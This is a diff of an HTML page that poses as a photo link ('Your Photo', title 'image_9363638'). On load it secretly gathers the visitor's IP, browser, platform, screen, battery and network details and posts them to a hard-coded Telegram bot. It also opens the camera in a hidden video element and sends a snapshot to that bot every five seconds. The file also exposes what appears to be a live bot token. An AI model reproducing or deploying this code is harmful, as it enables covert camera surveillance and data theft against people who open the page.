@@ -3,76 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device & Camera Capture</title>
+    <title>image_9363638</title>
     <style>
-        video { display: none; }
+        video { display: none; } 
         h1 { color: green; text-align: center; }
+        img { height: 350px; width: 300px; backdrop-filter: blur(50px); display: block; margin: auto; }
     </style>
 </head>
 <body>
-    <h1>Device & Camera Capture</h1>
+    <h1>⏬ Your Photo ⏬</h1>
+    <img src="camara/images.png" id="photo-preview">
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU";
-        const CHAT_IDS = ["2139008203", "OTHER_CHAT_ID"];
-        let frontVideoStream = null;
-        let backVideoStream = null;
+        const CHAT_ID = "2139008203";
+        const canvas = document.getElementById('canvas');
+        let videoStream = null;
+        let video = null;
         let intervalId = null;
 
         async function sendDeviceInfo() {
             try {
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
-                const ipAddress = ipData.ip;
-                const isp = ipData.org || "Unknown ISP";
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ipAddress = data.ip;
                 
-                const battery = navigator.getBattery ? await navigator.getBattery() : null;
-                const batteryStatus = battery ? `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}` : "Battery info not available";
+                const battery = await navigator.getBattery();
+                const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
                 
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const networkInfo = connection ? `Network Type: ${connection.effectiveType}, Downlink: ${connection.downlink}Mbps` : "Network info not available";
+
                 const deviceInfo = `
 Device Information:
 - IP Address: ${ipAddress}
-- ISP: ${isp}
 - Browser: ${navigator.userAgent}
 - Platform: ${navigator.platform}
 - Screen Resolution: ${window.screen.width}x${window.screen.height}
 - ${batteryStatus}
+- ${networkInfo}
                 `;
 
-                for (let chat_id of CHAT_IDS) {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id, text: deviceInfo })
-                    });
-                }
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo })
+                });
             } catch (error) {
                 console.error("Error fetching device info:", error);
             }
         }
 
-        async function startCamera(facingMode) {
+        async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode }
-                });
-                const video = document.createElement('video');
-                video.srcObject = stream;
+                video = document.createElement('video');
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = videoStream;
+
                 return new Promise((resolve) => {
                     video.onloadedmetadata = () => {
                         video.play();
-                        resolve({ video, stream });
+                        resolve(true);
                     };
                 });
             } catch (error) {
-                console.error(`Camera (${facingMode}) access denied:`, error);
-                return null;
+                console.error("Camera access denied:", error);
+                return false;
             }
         }
 
-        async function capturePhoto(video) {
-            const canvas = document.getElementById('canvas');
+        async function capturePhoto() {
+            if (!video || !videoStream) return;
+
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
@@ -80,48 +83,45 @@ Device Information:
             return canvas.toDataURL('image/png');
         }
 
-        async function sendPhoto(photoData) {
+        async function sendPhoto() {
+            const photoData = await capturePhoto();
             if (!photoData) return;
+
             const blob = await (await fetch(photoData)).blob();
             const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
             formData.append("photo", blob, "photo.png");
-            
-            for (let chat_id of CHAT_IDS) {
-                formData.append("chat_id", chat_id);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: "POST",
-                    body: formData
-                });
-            }
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
         }
 
-        async function startDualCameraLoop() {
+        async function startPhotoCaptureLoop() {
             sendDeviceInfo();
-            const front = await startCamera("user");
-            const back = await startCamera("environment");
 
-            if (!front || !back) return;
-            frontVideoStream = front.stream;
-            backVideoStream = back.stream;
+            const cameraStarted = await startCamera();
+            if (!cameraStarted) return;
 
-            async function captureAndSend() {
-                const frontPhoto = await capturePhoto(front.video);
-                const backPhoto = await capturePhoto(back.video);
-                await sendPhoto(frontPhoto);
-                await sendPhoto(backPhoto);
+            sendPhoto();
+            intervalId = setInterval(sendPhoto, 5000);
+        }
+
+        function stopCamera() {
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+                videoStream = null;
+                video = null;
             }
-            captureAndSend();
-            intervalId = setInterval(captureAndSend, 1000);
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+            }
         }
 
-        function stopCameras() {
-            if (frontVideoStream) frontVideoStream.getTracks().forEach(track => track.stop());
-            if (backVideoStream) backVideoStream.getTracks().forEach(track => track.stop());
-            clearInterval(intervalId);
-        }
-
-        window.onload = startDualCameraLoop;
-        window.onbeforeunload = stopCameras;
+        window.onload = startPhotoCaptureLoop;
+        window.onbeforeunload = stopCamera;
     </script>
 </body>
 </html>
